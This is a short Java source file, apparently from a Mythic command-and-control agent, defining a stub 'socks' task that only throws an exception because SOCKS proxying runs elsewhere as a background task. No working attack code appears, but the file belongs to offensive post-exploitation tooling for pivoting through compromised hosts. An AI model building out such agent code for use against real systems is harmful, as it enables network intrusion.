package com.woopsie.tasks;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.woopsie.Config;

import java.util.HashMap;
import java.util.Map;

/**
 * SOCKS5 proxy implementation for Mythic C2
 * This task should never be executed - SOCKS is handled entirely by SocksBackgroundTask
 * The Agent detects "socks" command and starts the background task directly
 */
public class SocksTask implements Task {
    
    @Override
    public String getCommandName() {
        return "socks";
    }
    
    @Override
    public String execute(Config config, JsonNode parameters) throws Exception {
        Config.debugLog(config, "SocksTask.execute() called - this should not happen!");
        
        // This should never actually be called - socks is handled as a background task
        // The Agent detects socks commands and starts the background task directly
        throw new Exception("SOCKS must be run as background task");
    }
}
